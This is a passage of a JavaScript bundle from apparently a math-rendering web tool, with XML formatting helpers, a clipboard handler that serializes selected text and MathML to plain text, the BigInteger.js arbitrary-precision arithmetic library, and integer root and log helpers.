  result["application/x-latex"] = mathmlToLaTeX(matrixContainer);
  return result;
};

var formatXml = function (xml) {
  // https://stackoverflow.com/questions/376373/pretty-printing-xml-with-javascript
  // Note: /.<\/\w[^>]*>$ is faster than /.+<\/\w[^>]*>$
  var formatted = '';
  var padding = '';
  var nodes = xml.replace(/></g, '>\n<').split('\n');
  for (var i = 0; i < nodes.length; i += 1) {
    var node = nodes[i];
    var indent = '';
    if (!/.<\/\w[^>]*>$/.test(node)) {
      if (/^<\/\w/.test(node)) {
        padding = padding.slice(0, 0 - '  '.length);
      } else {
        if (/^<\w[^>]*[^\/]>.*$/.test(node)) {
          indent = '  ';
        }
      }
    }
    formatted += padding + node + '\n';
    padding += indent;
  }
  return formatted;
};

  globalThis.getTableFromAsciiMathMatrix = getTableFromAsciiMathMatrix;
  //globalThis.serializeMathML = serializeMathML;
  globalThis.parseMathML = parseMathML;
  globalThis.formatXml = formatXml;
  globalThis.toMultilineString = toMultilineString;
  //globalThis.mathmlToLaTeX = mathmlToLaTeX;
  globalThis.getMatrixPresentationsFromMatrix = getMatrixPresentationsFromMatrix;

}());

/*global window, document, Node, transformMathML */

(function () {
"use strict";

var isBlock = function (display) {
  switch (display) {
    case "inline":
    case "inline-block":
    case "inline-flex":
    case "inline-grid":
    case "inline-table":
    case "none":
    case "table-column":
    case "table-column-group":
    case "table-cell":
      return false;
  }
  return true;
};

var getNodeLength = function (container) {
  if (container.nodeType === Node.TEXT_NODE) {
    return container.nodeValue.length;
  }
  if (container.nodeType === Node.ELEMENT_NODE) {
    var count = 0;
    var child = container.firstChild;
    while (child != null) {
      child = child.nextSibling;
      count += 1;
    }
    return count;
  }
  return undefined;
};

var isBoundaryPoint = function (container, offset, which, node) {
  var x = container;
  if (which === "end" && offset !== getNodeLength(container) || which === "start" && offset !== 0) {
    return false;
  }
  while (x !== node) {
    if (which === "end" && x.nextSibling != null || which === "start" && x.previousSibling != null) {
      return false;
    }
    x = x.parentNode;
  }
  return true;
};

var getChildNode = function (container, offset, which, node) {
  var child = null;
  var x = container;
  while (x !== node) {
    child = x;
    x = x.parentNode;
  }
  if (child != null) {
    child = which === "end" ? child.nextSibling : (which === "start" ? child : null);
  } else {
    var i = -1;
    child = container.firstChild; // node === container
    while (++i < offset) {
      child = child.nextSibling;
    }
  }
  return child;
};

var serialize = function (range, isLineStart) {
  // big thanks to everyone
  // see https://github.com/timdown/rangy/blob/master/src/modules/rangy-textrange.js
  // see https://github.com/WebKit/webkit/blob/ec2f4d46b97bb20fd0877b1f4b5ec50f7b9ec521/Source/WebCore/editing/TextIterator.cpp#L1188
  // see https://github.com/jackcviers/Rangy/blob/master/spec/innerText.htm

  var node = range.commonAncestorContainer;
  var startContainer = range.startContainer;
  var startOffset = range.startOffset;
  var endContainer = range.endContainer;
  var endOffset = range.endOffset;

  if (node.nodeType === Node.TEXT_NODE) {
    if (node !== startContainer || node !== endContainer) {
      throw new TypeError();
    }
    var nodeValue = node.nodeValue.slice(startOffset, endOffset);
    //var nodeValue = node.nodeValue.slice(node === startContainer ? startOffset : 0, node === endContainer ? endOffset : node.nodeValue.length);
    nodeValue = nodeValue.replace(/[\u0020\n\r\t\v]+/g, " ");
    if (isLineStart) {
      nodeValue = nodeValue.replace(/^[\u0020\n\r\t\v]/g, "");
    }
    return nodeValue;
  }
  if (node.nodeType === Node.ELEMENT_NODE) {
    var display = window.getComputedStyle(node, null).display;
    if (display === "none") {
      return "";
    }
    var result = "";
    if (isBlock(display) && !isLineStart) {
      result += "\n";
      isLineStart = true;
    }
    var x = undefined;
    if (isBoundaryPoint(startContainer, startOffset, "start", node) &&
        isBoundaryPoint(endContainer, endOffset, "end", node)) {
      var tagName = node.tagName.toLowerCase();
      if (tagName === 'math' || isMathMLTagName(tagName)) {
        x = transformMathML(node, "AsciiMath").string;
      }
      if (tagName === 'br') {
        x = "\n";
      }
    }
    if (x != undefined) {
      result += x;
    } else {
      var startChildNode = getChildNode(startContainer, startOffset, "start", node);
      var endChildNode = getChildNode(endContainer, endOffset, "end", node);
      var childNode = startChildNode;
      while (childNode !== endChildNode) {
        var childNodeRange = document.createRange();
        childNodeRange.setStart(childNode, 0);
        childNodeRange.setEnd(childNode, getNodeLength(childNode));
        if (childNode === startChildNode && startContainer !== node) {
          childNodeRange.setStart(startContainer, startOffset);
        }
        if (childNode.nextSibling === endChildNode && endContainer !== node) {
          childNodeRange.setEnd(endContainer, endOffset);
        }
        var y = serialize(childNodeRange, isLineStart);
        isLineStart = y === "" && isLineStart || y.slice(-1) === "\n";
        result += y;
        childNode = childNode.nextSibling;
      }
    }
    if (display === "table-cell") {
      result += "\t";
    }
    if (isBlock(display) && !isLineStart) {
      result = result.replace(/[\u0020\n\r\t\v]$/g, "");
      result += "\n";
      isLineStart = true;
    }
    return result;
  }
  return "";
};

var serializeAsPlainText = function (range) {
  var isLineStart = !(range.startContainer.nodeType === Node.TEXT_NODE && range.startContainer.nodeValue.slice(0, range.startOffset).replace(/\s+/g, "") !== "");
  var isLineEnd = !(range.endContainer.nodeType === Node.TEXT_NODE && range.endContainer.nodeValue.slice(range.endOffset, range.endContainer.nodeValue.length).replace(/\s+/g, "") !== "");
  var value = serialize(range, false);
  if (isLineStart) {
    value = value.replace(/^\s/g, "");
  }
  if (isLineEnd) {
    value = value.replace(/\s$/g, "");
  }
  return value;
};

var isMathMLTagName = function (tagName) {
  if (tagName.charCodeAt(0) === 'm'.charCodeAt(0)) {
    switch (tagName) {
      case 'main':
      case 'map':
      case 'mark':
      case 'math':
      case 'menu':
      case 'menuitem':
      case 'meta':
      case 'meter':
        return false;
    }
    return true;
  }
  return false;
};

var serializeAsHTML = function (range) {
  var fragment = range.cloneContents();
  var div = document.createElement("div");
  div.appendChild(fragment);
  return div.innerHTML;
};

var onCopyOrDragStart = function (event) {
  var dataTransfer = event.type === "copy" ? event.clipboardData : event.dataTransfer;
  var tagName = event.target.nodeType === Node.ELEMENT_NODE ? event.target.tagName.toLowerCase() : '';
  if (tagName !== 'input' && tagName !== 'textarea' && (tagName !== 'a' || event.type === 'copy') && tagName !== 'img') {
    //! dataTransfer.effectAllowed throws an exception in FireFox if tagName is INPUT or TEXTAREA
    if ((event.type === "copy" || dataTransfer.effectAllowed === "uninitialized") && !event.defaultPrevented) {
      var selection = window.getSelection();
      var rangeCount = selection.rangeCount;
      if (rangeCount !== 0 && !selection.isCollapsed) {
        var i = -1;
        var plainText = "";
        var htmlText = "";
        while (++i < rangeCount) {
          var range = selection.getRangeAt(i);
          htmlText += serializeAsHTML(range);
          plainText += serializeAsPlainText(range);
        }
        dataTransfer.setData("text/plain", plainText);
        dataTransfer.setData("text/html", htmlText);
        if (event.type === "copy") {
          event.preventDefault();
        } else {
          dataTransfer.effectAllowed = "copy";
        }
      }
    }
  }
};

if (typeof document !== 'undefined') {
  document.addEventListener("copy", onCopyOrDragStart, false);
  document.addEventListener("dragstart", onCopyOrDragStart, false);
}

//!
globalThis.rangeInnerText = serializeAsPlainText;

}());

(function () {
"use strict";
/*jslint plusplus: true, vars: true, indent: 2*/

  // BigInteger.js
  // Available under Public Domain
  // https://github.com/Yaffle/BigInteger/

  // For implementation details, see "The Handbook of Applied Cryptography"
  // http://www.cacr.math.uwaterloo.ca/hac/about/chap14.pdf

  var parseInteger = function (s, from, to, radix) {
    var i = from - 1;
    var n = 0;
    var y = radix < 10 ? radix : 10;
    while (++i < to) {
      var code = s.charCodeAt(i);
      var v = code - 48;
      if (v < 0 || y <= v) {
        v = 10 - 65 + code;
        if (v < 10 || radix <= v) {
          v = 10 - 97 + code;
          if (v < 10 || radix <= v) {
            throw new RangeError();
          }
        }
      }
      n = n * radix + v;
    }
    return n;
  };

  var createArray = function (length) {
    var x = new Array(length);
    var i = -1;
    while (++i < length) {
      x[i] = 0;
    }
    return x;
  };

  var epsilon = 2 / (9007199254740991 + 1);
  while (1 + epsilon / 2 !== 1) {
    epsilon /= 2;
  }
  var BASE = 2 / epsilon;
  var s = 134217728;
  while (s * s < 2 / epsilon) {
    s *= 2;
  }
  var SPLIT = s + 1;

  // Veltkamp-Dekker's algorithm
  // see http://web.mit.edu/tabbott/Public/quaddouble-debian/qd-2.3.4-old/docs/qd.pdf
  var fma = function (a, b, product) {
    var at = SPLIT * a;
    var ahi = at - (at - a);
    var alo = a - ahi;
    var bt = SPLIT * b;
    var bhi = bt - (bt - b);
    var blo = b - bhi;
    var error = ((ahi * bhi + product) + ahi * blo + alo * bhi) + alo * blo;
    return error;
  };

  var fastTrunc = function (x) {
    var v = (x - BASE) + BASE;
    return v > x ? v - 1 : v;
  };

  var performMultiplication = function (carry, a, b) {
    var product = a * b;
    var error = fma(a, b, -product);

    var hi = fastTrunc(product / BASE);
    var lo = product - hi * BASE + error;

    if (lo < 0) {
      lo += BASE;
      hi -= 1;
    }

    lo += carry - BASE;
    if (lo < 0) {
      lo += BASE;
    } else {
      hi += 1;
    }

    return {lo: lo, hi: hi};
  };

  var performDivision = function (a, b, divisor) {
    if (a >= divisor) {
      throw new RangeError();
    }
    var p = a * BASE;
    var q = fastTrunc(p / divisor);

    var r = 0 - fma(q, divisor, -p);
    if (r < 0) {
      q -= 1;
      r += divisor;
    }

    r += b - divisor;
    if (r < 0) {
      r += divisor;
    } else {
      q += 1;
    }
    var y = fastTrunc(r / divisor);
    r -= y * divisor;
    q += y;
    return {q: q, r: r};
  };

  function BigIntegerInternal(sign, magnitude, length) {
    this.sign = sign;
    this.magnitude = magnitude;
    this.length = length;
  }

  var createBigInteger = function (sign, magnitude, length) {
    return new BigIntegerInternal(sign, magnitude, length);
  };

  var fromNumber = function (n) {
    if (n >= BASE || 0 - n >= BASE) {
      throw new RangeError();
    }
    var a = createArray(1);
    a[0] = n < 0 ? 0 - n : 0 + n;
    return createBigInteger(n < 0 ? 1 : 0, a, n === 0 ? 0 : 1);
  };

  var fromString = function (s) {
    var length = s.length;
    if (length === 0) {
      throw new RangeError();
    }
    var sign = 0;
    var signCharCode = s.charCodeAt(0);
    var from = 0;
    if (signCharCode === 43) { // "+"
      from = 1;
    }
    if (signCharCode === 45) { // "-"
      from = 1;
      sign = 1;
    }
    var radix = 10;
    if (from === 0 && s.length >= 2 && s.charCodeAt(0) === 48) {
      if (s.charCodeAt(1) === 98) {
        radix = 2;
        from = 2;
      } else if (s.charCodeAt(1) === 111) {
        radix = 8;
        from = 2;
      } else if (s.charCodeAt(1) === 120) {
        radix = 16;
        from = 2;
      }
    }
    length -= from;
    if (length === 0) {
      throw new RangeError();
    }

    var groupLength = 0;
    var groupRadix = 1;
    var limit = fastTrunc(BASE / radix);
    while (groupRadix <= limit) {
      groupLength += 1;
      groupRadix *= radix;
    }

    var size = Math.floor((length - 1) / groupLength) + 1;
    var magnitude = createArray(size);
    var start = from + 1 + (length - 1 - (size - 1) * groupLength) - groupLength;

    var j = -1;
    while (++j < size) {
      var groupStart = start + j * groupLength;
      var c = parseInteger(s, (groupStart >= from ? groupStart : from), groupStart + groupLength, radix);
      var l = -1;
      while (++l < j) {
        var tmp = performMultiplication(c, magnitude[l], groupRadix);
        var lo = tmp.lo;
        var hi = tmp.hi;
        magnitude[l] = lo;
        c = hi;
      }
      magnitude[j] = c;
    }

    while (size > 0 && magnitude[size - 1] === 0) {
      size -= 1;
    }

    return createBigInteger(size === 0 ? 0 : sign, magnitude, size);
  };

  BigIntegerInternal.BigInt = function (x) {
    if (typeof x === "number") {
      return fromNumber(x);
    }
    if (typeof x === "string") {
      return fromString(x);
    }
    throw new RangeError();
  };

  BigIntegerInternal.toNumber = function (a) {
    if (a.length === 0) {
      return 0;
    }
    if (a.length === 1) {
      return a.sign === 1 ? 0 - a.magnitude[0] : a.magnitude[0];
    }
    if (BASE + 1 !== BASE) {
      throw new RangeError();
    }
    var x = a.magnitude[a.length - 1];
    var y = a.magnitude[a.length - 2];
    var i = a.length - 3;
    while (i >= 0 && a.magnitude[i] === 0) {
      i -= 1;
    }
    if (i >= 0 && y % 2 === 1) {
      y += 1;
    }
    var z = (x * BASE + y) * Math.pow(BASE, a.length - 2);
    return a.sign === 1 ? 0 - z : z;
  };

  var compareMagnitude = function (a, b) {
    if (a.length !== b.length) {
      return a.length < b.length ? -1 : +1;
    }
    var i = a.length;
    while (--i >= 0) {
      if (a.magnitude[i] !== b.magnitude[i]) {
        return a.magnitude[i] < b.magnitude[i] ? -1 : +1;
      }
    }
    return 0;
  };

  var compareTo = function (a, b) {
    var c = a.sign === b.sign ? compareMagnitude(a, b) : 1;
    return a.sign === 1 ? 0 - c : c; // positive zero will be returned for c === 0
  };

  var addAndSubtract = function (a, b, isSubtraction) {
    var z = compareMagnitude(a, b);
    var resultSign = z < 0 ? (isSubtraction !== 0 ? 1 - b.sign : b.sign) : a.sign;
    var min = z < 0 ? a : b;
    var max = z < 0 ? b : a;
    // |a| <= |b|
    if (min.length === 0) {
      return createBigInteger(resultSign, max.magnitude, max.length);
    }
    var subtract = 0;
    var resultLength = max.length;
    if (a.sign !== (isSubtraction !== 0 ? 1 - b.sign : b.sign)) {
      subtract = 1;
      if (min.length === resultLength) {
        while (resultLength > 0 && min.magnitude[resultLength - 1] === max.magnitude[resultLength - 1]) {
          resultLength -= 1;
        }
      }
      if (resultLength === 0) { // a === (-b)
        return createBigInteger(0, createArray(0), 0);
      }
    }
    // result !== 0
    var result = createArray(resultLength + (1 - subtract));
    var i = -1;
    var c = 0;
    while (++i < resultLength) {
      var aDigit = i < min.length ? min.magnitude[i] : 0;
      c += max.magnitude[i] + (subtract !== 0 ? 0 - aDigit : aDigit - BASE);
      if (c < 0) {
        result[i] = BASE + c;
        c = 0 - subtract;
      } else {
        result[i] = c;
        c = 1 - subtract;
      }
    }
    if (subtract === 0) {
      result[resultLength] = c;
      resultLength += c !== 0 ? 1 : 0;
    } else {
      while (resultLength > 0 && result[resultLength - 1] === 0) {
        resultLength -= 1;
      }
    }
    return createBigInteger(resultSign, result, resultLength);
  };

  BigIntegerInternal.add = function (a, b) {
    return addAndSubtract(a, b, 0);
  };

  BigIntegerInternal.subtract = function (a, b) {
    return addAndSubtract(a, b, 1);
  };

  BigIntegerInternal.multiply = function (a, b) {
    if (a.length === 0 || b.length === 0) {
      return createBigInteger(0, createArray(0), 0);
    }
    if (a.length === 1 && a.magnitude[0] === 1) {
      return createBigInteger(a.sign === 1 ? 1 - b.sign : b.sign, b.magnitude, b.length);
    }
    if (b.length === 1 && b.magnitude[0] === 1) {
      return createBigInteger(a.sign === 1 ? 1 - b.sign : b.sign, a.magnitude, a.length);
    }
    var resultSign = a.sign === 1 ? 1 - b.sign : b.sign;
    var resultLength = a.length + b.length;
    var result = createArray(resultLength);
    var i = -1;
    while (++i < b.length) {
      if (b.magnitude[i] !== 0) { // to optimize multiplications by a power of BASE
        var c = 0;
        var j = -1;
        while (++j < a.length) {
          var carry = 0;
          c += result[j + i] - BASE;
          if (c >= 0) {
            carry = 1;
          } else {
            c += BASE;
          }
          var tmp = performMultiplication(c, a.magnitude[j], b.magnitude[i]);
          var lo = tmp.lo;
          var hi = tmp.hi;
          result[j + i] = lo;
          c = hi + carry;
        }
        result[a.length + i] = c;
      }
    }
    while (resultLength > 0 && result[resultLength - 1] === 0) {
      resultLength -= 1;
    }
    return createBigInteger(resultSign, result, resultLength);
  };

  var divideAndRemainder = function (a, b, isDivision) {
    if (b.length === 0) {
      throw new RangeError();
    }
    if (a.length === 0) {
      return createBigInteger(0, createArray(0), 0);
    }
    var quotientSign = a.sign === 1 ? 1 - b.sign : b.sign;
    if (b.length === 1 && b.magnitude[0] === 1) {
      if (isDivision !== 0) {
        return createBigInteger(quotientSign, a.magnitude, a.length);
      }
      return createBigInteger(0, createArray(0), 0);
    }

    var divisorOffset = a.length + 1; // `+ 1` for extra digit in case of normalization
    var divisorAndRemainder = createArray(divisorOffset + b.length + 1); // `+ 1` to avoid `index < length` checks
    var divisor = divisorAndRemainder;
    var remainder = divisorAndRemainder;
    var n = -1;
    while (++n < a.length) {
      remainder[n] = a.magnitude[n];
    }
    var m = -1;
    while (++m < b.length) {
      divisor[divisorOffset + m] = b.magnitude[m];
    }

    var top = divisor[divisorOffset + b.length - 1];

    // normalization
    var lambda = 1;
    if (b.length > 1) {
      lambda = fastTrunc(BASE / (top + 1));
      if (lambda > 1) {
        var carry = 0;
        var l = -1;
        while (++l < divisorOffset + b.length) {
          var tmp = performMultiplication(carry, divisorAndRemainder[l], lambda);
          var lo = tmp.lo;
          var hi = tmp.hi;
          divisorAndRemainder[l] = lo;
          carry = hi;
        }
        divisorAndRemainder[divisorOffset + b.length] = carry;
        top = divisor[divisorOffset + b.length - 1];
      }
      // assertion
      if (top < fastTrunc(BASE / 2)) {
        throw new RangeError();
      }
    }

    var shift = a.length - b.length + 1;
    if (shift < 0) {
      shift = 0;
    }
    var quotient = undefined;
    var quotientLength = 0;

    // to optimize divisions by a power of BASE
    var lastNonZero = 0;
    while (divisor[divisorOffset + lastNonZero] === 0) {
      lastNonZero += 1;
    }

    var i = shift;
    while (--i >= 0) {
      var t = b.length + i;
      var q = BASE - 1;
      if (remainder[t] !== top) {
        var tmp2 = performDivision(remainder[t], remainder[t - 1], top);
        var q2 = tmp2.q;
        //var r2 = tmp2.r;
        q = q2;
      }

      var ax = 0;
      var bx = 0;
      var j = i - 1 + lastNonZero;
      while (++j <= t) {
        var tmp3 = performMultiplication(bx, q, divisor[divisorOffset + j - i]);
        var lo3 = tmp3.lo;
        var hi3 = tmp3.hi;
        bx = hi3;
        ax += remainder[j] - lo3;
        if (ax < 0) {
          remainder[j] = BASE + ax;
          ax = -1;
        } else {
          remainder[j] = ax;
          ax = 0;
        }
      }
      while (ax !== 0) {
        q -= 1;
        var c = 0;
        var k = i - 1 + lastNonZero;
        while (++k <= t) {
          c += remainder[k] - BASE + divisor[divisorOffset + k - i];
          if (c < 0) {
            remainder[k] = BASE + c;
            c = 0;
          } else {
            remainder[k] = c;
            c = +1;
          }
        }
        ax += c;
      }
      if (isDivision !== 0 && q !== 0) {
        if (quotientLength === 0) {
          quotientLength = i + 1;
          quotient = createArray(quotientLength);
        }
        quotient[i] = q;
      }
    }

    if (isDivision !== 0) {
      if (quotientLength === 0) {
        return createBigInteger(0, createArray(0), 0);
      }
      return createBigInteger(quotientSign, quotient, quotientLength);
    }

    var remainderLength = a.length + 1;
    if (lambda > 1) {
      var r = 0;
      var p = remainderLength;
      while (--p >= 0) {
        var tmp4 = performDivision(r, remainder[p], lambda);
        var q4 = tmp4.q;
        var r4 = tmp4.r;
        remainder[p] = q4;
        r = r4;
      }
      if (r !== 0) {
        // assertion
        throw new RangeError();
      }
    }
    while (remainderLength > 0 && remainder[remainderLength - 1] === 0) {
      remainderLength -= 1;
    }
    if (remainderLength === 0) {
      return createBigInteger(0, createArray(0), 0);
    }
    var result = createArray(remainderLength);
    var o = -1;
    while (++o < remainderLength) {
      result[o] = remainder[o];
    }
    return createBigInteger(a.sign, result, remainderLength);
  };

  BigIntegerInternal.divide = function (a, b) {
    return divideAndRemainder(a, b, 1);
  };

  BigIntegerInternal.remainder = function (a, b) {
    return divideAndRemainder(a, b, 0);
  };

  BigIntegerInternal.unaryMinus = function (a) {
    return createBigInteger(a.length === 0 ? a.sign : 1 - a.sign, a.magnitude, a.length);
  };

  BigIntegerInternal.equal = function (a, b) {
    return compareTo(a, b) === 0;
  };
  BigIntegerInternal.lessThan = function (a, b) {
    return compareTo(a, b) < 0;
  };
  BigIntegerInternal.greaterThan = function (a, b) {
    return compareTo(a, b) > 0;
  };

  BigIntegerInternal.exponentiate = function (a, b) {
    var n = BigIntegerInternal.toNumber(b);
    if (n < 0) {
      throw new RangeError();
    }
    if (n > 9007199254740991) {
      var y = BigIntegerInternal.toNumber(a);
      if (y === 0 || y === -1 || y === +1) {
        return BigIntegerInternal.BigInt(y === -1 && BigIntegerInternal.toNumber(BigIntegerInternal.remainder(b, BigIntegerInternal.BigInt(2))) === 0 ? +1 : y);
      }
      throw new RangeError();
    }
    var accumulator = BigIntegerInternal.BigInt(1);
    if (n > 0) {
      var x = a;
      while (n >= 2) {
        var t = Math.floor(n / 2);
        if (t * 2 !== n) {
          accumulator = BigIntegerInternal.multiply(accumulator, x);
        }
        n = t;
        x = BigIntegerInternal.multiply(x, x);
      }
      accumulator = BigIntegerInternal.multiply(accumulator, x);
    }
    return accumulator;
  };

  BigIntegerInternal.prototype.toString = function (radix) {
    if (radix == undefined) {
      radix = 10;
    }
    if (radix !== 10 && (radix < 2 || radix > 36 || radix !== Math.floor(radix))) {
      throw new RangeError("radix argument must be an integer between 2 and 36");
    }

    var a = this;
    var result = a.sign === 1 ? "-" : "";

    var remainderLength = a.length;
    if (remainderLength === 0) {
      return "0";
    }
    if (remainderLength === 1) {
      result += a.magnitude[0].toString(radix);
      return result;
    }
    var groupLength = 0;
    var groupRadix = 1;
    var limit = fastTrunc(BASE / radix);
    while (groupRadix <= limit) {
      groupLength += 1;
      groupRadix *= radix;
    }
    // assertion
    if (groupRadix * radix <= BASE) {
      throw new RangeError();
    }
    var size = remainderLength + Math.floor((remainderLength - 1) / groupLength) + 1;
    var remainder = createArray(size);
    var n = -1;
    while (++n < remainderLength) {
      remainder[n] = a.magnitude[n];
    }

    var k = size;
    while (remainderLength !== 0) {
      var groupDigit = 0;
      var i = remainderLength;
      while (--i >= 0) {
        var tmp = performDivision(groupDigit, remainder[i], groupRadix);
        var q = tmp.q;
        var r = tmp.r;
        remainder[i] = q;
        groupDigit = r;
      }
      while (remainderLength > 0 && remainder[remainderLength - 1] === 0) {
        remainderLength -= 1;
      }
      k -= 1;
      remainder[k] = groupDigit;
    }
    result += remainder[k].toString(radix);
    while (++k < size) {
      var t = remainder[k].toString(radix);
      var j = groupLength - t.length;
      while (--j >= 0) {
        result += "0";
      }
      result += t;
    }
    return result;
  };

  function BigIntWrapper() {
  }

  BigIntWrapper.BigInt = function (x) {
    return BigInt(x);
  };
  BigIntWrapper.toNumber = function (bigint) {
    return Number(bigint);
  };
  BigIntWrapper.add = function (a, b) {
    return a + b;
  };
  BigIntWrapper.subtract = function (a, b) {
    return a - b;
  };
  BigIntWrapper.multiply = function (a, b) {
    return a * b;
  };
  BigIntWrapper.divide = function (a, b) {
    return a / b;
  };
  BigIntWrapper.remainder = function (a, b) {
    return a % b;
  };
  BigIntWrapper.unaryMinus = function (a) {
    return -a;
  };
  BigIntWrapper.equal = function (a, b) {
    return a === b;
  };
  BigIntWrapper.lessThan = function (a, b) {
    return a < b;
  };
  BigIntWrapper.greaterThan = function (a, b) {
    return a > b;
  };

  BigIntWrapper.exponentiate = function (a, b) {
    var n = BigIntWrapper.toNumber(b);
    if (n < 0) {
      throw new RangeError();
    }
    if (n > 9007199254740991) {
      var y = BigIntWrapper.toNumber(a);
      if (y === 0 || y === -1 || y === +1) {
        return BigIntWrapper.BigInt(y === -1 && BigIntWrapper.toNumber(BigIntWrapper.remainder(b, BigIntWrapper.BigInt(2))) === 0 ? +1 : y);
      }
      throw new RangeError();
    }
    var accumulator = BigIntWrapper.BigInt(1);
    if (n > 0) {
      var x = a;
      while (n >= 2) {
        var t = Math.floor(n / 2);
        if (t * 2 !== n) {
          accumulator = BigIntWrapper.multiply(accumulator, x);
        }
        n = t;
        x = BigIntWrapper.multiply(x, x);
      }
      accumulator = BigIntWrapper.multiply(accumulator, x);
    }
    return accumulator;
  };

  // noinline
  var n = function (f) {
    return function (x, y) {
      return f(x, y);
    };
  };

  var Internal = typeof BigInt !== "undefined" && BigInt(9007199254740991) + BigInt(2) - BigInt(2) === BigInt(9007199254740991) ? BigIntWrapper : BigIntegerInternal;

  var toNumber = n(function (a) {
    return Internal.toNumber(a);
  });
  var valueOf = function (x) {
    if (typeof x === "number") {
      return Internal.BigInt(x);
    }
    return x;
  };
  var toResult = function (x) {
    var value = Internal.toNumber(x);
    if (value >= -9007199254740991 && value <= +9007199254740991) {
      return value;
    }
    return x;
  };
  var add = n(function (x, y) {
    var a = valueOf(x);
    var b = valueOf(y);
    return toResult(Internal.add(a, b));
  });
  var subtract = n(function (x, y) {
    var a = valueOf(x);
    var b = valueOf(y);
    return toResult(Internal.subtract(a, b));
  });
  var multiply = n(function (x, y) {
    if (x === y) {
      var c = valueOf(x);
      return Internal.multiply(c, c);
    }
    var a = valueOf(x);
    var b = valueOf(y);
    return toResult(Internal.multiply(a, b));
  });
  var divide = n(function (x, y) {
    var a = valueOf(x);
    var b = valueOf(y);
    return toResult(Internal.divide(a, b));
  });
  var remainder = n(function (x, y) {
    var a = valueOf(x);
    var b = valueOf(y);
    return toResult(Internal.remainder(a, b));
  });
  var exponentiate = n(function (x, y) {
    var a = valueOf(x);
    var b = valueOf(y);
    return toResult(Internal.exponentiate(a, b));
  });
  var unaryMinus = n(function (x) {
    var a = valueOf(x);
    return Internal.unaryMinus(a);
  });
  var equal = n(function (x, y) {
    if (typeof x === "number") {
      return x === Internal.toNumber(y);
    }
    if (typeof y === "number") {
      return Internal.toNumber(x) === y;
    }
    return Internal.equal(x, y);
  });
  var lessThan = n(function (x, y) {
    if (typeof x === "number") {
      return x < Internal.toNumber(y);
    }
    if (typeof y === "number") {
      return Internal.toNumber(x) < y;
    }
    return Internal.lessThan(x, y);
  });
  var greaterThan = n(function (x, y) {
    if (typeof x === "number") {
      return x > Internal.toNumber(y);
    }
    if (typeof y === "number") {
      return Internal.toNumber(x) > y;
    }
    return Internal.greaterThan(x, y);
  });

  function BigInteger() {
  }

  // Conversion from String:
  // Conversion from Number:
  BigInteger.BigInt = function (x) {
    if (typeof x === "number") {
      return x;
    }
    var value = 0 + Number(x);
    if (value >= -9007199254740991 && value <= +9007199254740991) {
      return value;
    }
    return Internal.BigInt(x);
  };
  // Conversion to Number:
  BigInteger.toNumber = function (x) {
    if (typeof x === "number") {
      return x;
    }
    return toNumber(x);
  };

  // Arithmetic:
  BigInteger.add = function (x, y) {
    if (typeof x === "number" && typeof y === "number") {
      var value = x + y;
      if (value >= -9007199254740991 && value <= +9007199254740991) {
        return value;
      }
    }
    return add(x, y);
  };
  BigInteger.subtract = function (x, y) {
    if (typeof x === "number" && typeof y === "number") {
      var value = x - y;
      if (value >= -9007199254740991 && value <= +9007199254740991) {
        return value;
      }
    }
    return subtract(x, y);
  };
  BigInteger.multiply = function (x, y) {
    if (typeof x === "number" && typeof y === "number") {
      var value = 0 + x * y;
      if (value >= -9007199254740991 && value <= +9007199254740991) {
        return value;
      }
    }
    return multiply(x, y);
  };
  BigInteger.divide = function (x, y) {
    if (typeof x === "number" && typeof y === "number") {
      if (y !== 0) {
        return x === 0 ? 0 : (x > 0 && y > 0) || (x < 0 && y < 0) ? 0 + Math.floor(x / y) : 0 - Math.floor((0 - x) / y);
      }
    }
    return divide(x, y);
  };
  BigInteger.remainder = function (x, y) {
    if (typeof x === "number" && typeof y === "number") {
      if (y !== 0) {
        return 0 + x % y;
      }
    }
    return remainder(x, y);
  };
  BigInteger.unaryMinus = function (x) {
    if (typeof x === "number") {
      return 0 - x;
    }
    return unaryMinus(x);
  };

  // Comparison:
  BigInteger.equal = function (x, y) {
    if (typeof x === "number" && typeof y === "number") {
      return x === y;
    }
    return equal(x, y);
  };
  BigInteger.lessThan = function (x, y) {
    if (typeof x === "number" && typeof y === "number") {
      return x < y;
    }
    return lessThan(x, y);
  };
  BigInteger.greaterThan = function (x, y) {
    if (typeof x === "number" && typeof y === "number") {
      return x > y;
    }
    return greaterThan(x, y);
  };

  BigInteger.exponentiate = function (x, y) {
    if (typeof x === "number" && typeof y === "number" && y >= 0 && y < 53) { // Math.log2(9007199254740991 + 1)
      var value = 0 + Math.pow(x, y);
      if (value >= -9007199254740991 && value <= 9007199254740991) {
        return value;
      }
    }
    return exponentiate(x, y);
  };

  self.BigInteger = BigInteger;

})();
(function () {
"use strict";


// floor(log(n) / log(b)), n >= 1, base >= 2
// https://programmingpraxis.com/contents/standard-prelude/
function ilogb(n, base) {
  var i = BigInteger.BigInt(0);
  while (!BigInteger.lessThan(n, BigInteger.exponentiate(base, BigInteger.exponentiate(BigInteger.BigInt(2), i)))) {
    i = BigInteger.add(i, BigInteger.BigInt(1));
  }
  var e = BigInteger.BigInt(0);
  var t = BigInteger.BigInt(1);
  while (!BigInteger.lessThan(i, BigInteger.BigInt(0))) {
    var b = BigInteger.exponentiate(BigInteger.BigInt(2), i);
    if (!BigInteger.lessThan(n, BigInteger.multiply(t, BigInteger.exponentiate(base, b)))) {
      t = BigInteger.multiply(t, BigInteger.exponentiate(base, b));
      e = BigInteger.add(e, b);
    }
    i = BigInteger.subtract(i, BigInteger.BigInt(1));
  }
  return e;
}

function ilog2(n) {
  return ilogb(n, BigInteger.BigInt(2));
}

// floor(S**(1/n)), S >= 1, n >= 2
// https://en.wikipedia.org/wiki/Methods_of_computing_square_roots#Babylonian_method
// https://stackoverflow.com/a/15979957/839199y
function nthRoot(S, n) {
  if (n < 2 || n % 2 === 0 && BigInteger.lessThan(S, 0)) {
    throw new RangeError();
  }
  if (!BigInteger.lessThan(BigInteger.BigInt(2), n)) {
    var t = BigInteger.toNumber(S);
    if (t < (9007199254740991 + 1) / 2) {
      return BigInteger.BigInt(Math.floor(Math.sqrt(t + 0.5)));
    }
    if (t < (9007199254740991 + 1) / 2 * (9007199254740991 + 1) / 2) {
      var y = BigInteger.BigInt(Math.floor(Math.sqrt(t) + 0.5));
      if (BigInteger.lessThan(S, BigInteger.multiply(y, y))) {
        y = BigInteger.subtract(y, BigInteger.BigInt(1));
      }
      return y;
    }
  }
  var e = ilog2(S);
  if (BigInteger.lessThan(e, n)) {
    return BigInteger.BigInt(1);
  }
  var f = BigInteger.divide(BigInteger.add(e, n), BigInteger.multiply(BigInteger.BigInt(2), n));
